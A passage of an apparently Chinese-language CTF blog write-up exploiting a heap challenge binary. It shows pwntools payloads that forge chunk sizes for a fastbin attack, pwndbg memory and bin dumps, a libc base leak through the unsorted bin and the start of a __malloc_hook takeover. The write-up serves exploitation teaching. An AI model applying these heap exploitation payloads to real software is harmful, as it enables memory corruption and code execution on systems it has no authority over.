id="1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21"><a href="#1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21" class="headerlink" title="1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21"></a>1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后再通过index3去进行写入,把index4的大小改成0x21</span><br><span class="hljs-comment">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fastbin的范围内（请注意这点)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2（fastbin）</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757080</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4（fastbin）</span><br>--------------------------------------------------------------    <br>执行payload前原来的内容为：<br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（fastbin）</span><br>-------------------------------------------------------------- <br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>再次强调，在申请fastbin中内存时，会检查被释放堆块的size（大小）是否在fastbin的范围内，如果不在，程序则异常退出，这有关于fastbin的机制。结构体状况未发生改变。</p><h4 id="1-6-申请-index4"><a href="#1-6-申请-index4" class="headerlink" title="1-6-申请-index4"></a>1-6 申请 index4</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#改好index4的大小之后去申请两次，这样就把原来的fastbin中的给申请出来了</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#申请成功之后index2就指向index4</span><br></code></pre></td></tr></tbody></table></figure><p>首先是两个malloc，前面fastbin里一开始是两个chunk，分别为index2-&gt;index1，后来我们修改index2-&gt;fd为index4的地址，fastbin里变为</p><p>index2-&gt;index4。第一个malloc会先分配index2给我们（fastbin分配原则是LIFO即后进先出），第二个malloc会将index4分配给我们。<br>看一下堆：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此时的内存：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此时的结构体状况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#index1（chunk_flag改变）</span><br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757050</span><br>                <span class="hljs-comment">#chunk_content_size（改变）   #chunk_data_ptr（改变）     </span><br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     <span class="hljs-comment">#index2（chunk_flag改变）  #chunk_data_size（改变）     </span><br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#chunk_data_ptr（改变）  #index3</span><br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><p>注意，此时我们有两个地方指向index4：<br><strong>index4的content指针</strong>（程序的正常指向）<br><strong>index2的content指针</strong> （通过执行payload中malloc之后的指向，参照上方代码框中的结构体）<br>第二个malloc得到的是index为2的chunk，这与程序中的Allocate函数有关，可以回顾一下前面的IDA代码。<br>也就是说假如我们现在要fill index2的内容，那么其实上是修改index4的内容。</p><h4 id="1-7-修改-index4-的-size-为0x91"><a href="#1-7-修改-index4-的-size-为0x91" class="headerlink" title="1-7-修改-index4-的-size-为0x91"></a>1-7 修改 index4 的 size 为0x91</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#为了让index4能够被放到unsortedbin中,要把它的大小改回来</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>程序结构体未发生变化</p><h4 id="1-8-申请新堆块-index-5"><a href="#1-8-申请新堆块-index-5" class="headerlink" title="1-8-申请新堆块-index-5"></a>1-8 申请新堆块 index 5</h4><p>目的只是为了防止 index4 释放后与 top chunk 合并</p><h4 id="1-9-free-index4-，index4-放入-unsorted-bin-中"><a href="#1-9-free-index4-，index4-放入-unsorted-bin-中" class="headerlink" title="1-9-free-index4-，index4-放入-unsorted-bin-中"></a>1-9 free(index4)，index4 放入 unsorted bin 中</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这时候free就会把index4放到unsorted中了</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">Free chunk (unsortedbin) | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x91</span><br>fd: <span class="hljs-number">0x00</span><br>bk: <span class="hljs-number">0x7ffff7dd1b78</span><br><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（unsortedbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index5</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>当unsortedbin里只有一个空闲的chunk时，该chunk的fd和bk指针均指向unsortedbin本身，这个可以参考CTF-wiki中的内容，这里先不细说。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000001</span><br>        <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#（此处发生了改变）   #index5</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000080</span><span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-10-计算libc基址"><a href="#1-10-计算libc基址" class="headerlink" title="1-10-计算libc基址"></a>1-10 计算libc基址</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">-----------------------------------------------------------------------------<br>还可以直接这样写<br>libc_base = u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))-<span class="hljs-number">0x3c4b78</span><br>-----------------------------------------------------------------------------<br>示例payload的写法：<br><span class="hljs-comment">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="hljs-comment">#main_arena与libc偏移为0x3c4b20(附件中有工具)</span><br><span class="hljs-comment">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#这函数还不太明白</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br>-----------------------------------------------------------------------------<br></code></pre></td></tr></tbody></table></figure><h3 id="2-控制-malloc-hook"><a href="#2-控制-malloc-hook" class="headerlink" title="2-控制-malloc-hook"></a>2. 控制_malloc_hook</h3><h4 id="2-1-申请-unsorted-bin-中的-chunk"><a href="#2-1-申请-unsorted-bin-中的-chunk" class="headerlink" title="2-1-申请-unsorted-bin-中的-chunk"></a>2-1 申请 unsorted bin 中的 chunk</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure><p>由于在申请空间之前，之后unsortedbin中有空闲的空间，因此申请空间之后会使用unsortedbin中的chunk。<br>看一下此时的堆内存：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4(由unsortedbin分裂)</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5(由unsortedbin分裂)</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6（原index5）</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的堆情况可以看到，由于是malloc(0x60)，而原unsortedbin中的chunk_size过大，因此unsortedbin中的chunk会利用并分裂成两个堆块，其中index5还是存放在unsortedbin中的：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x5555557570f0</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x5555557570f0</span><br>BK: <span class="hljs-number">0x5555557570f0</span> ◂— <span class="hljs-number">0x90</span><br>----------------------------------------------------------------------<br>执行payload前：<br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x555555757080</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x555555757080</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x555555757080</span><br>----------------------------------------------------------------------<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-2-free-index4"><a href="#2-2-free-index4" class="headerlink" title="2-2-free-index4"></a>2-2 free(index4)</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#index2_content指针还是指向index4_chunk_data</span><br><span class="hljs-comment">#为了修改之后index4的fd指针，因此我们可以先释放index4</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x555555757080</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin （这里显示不准确）<br><span 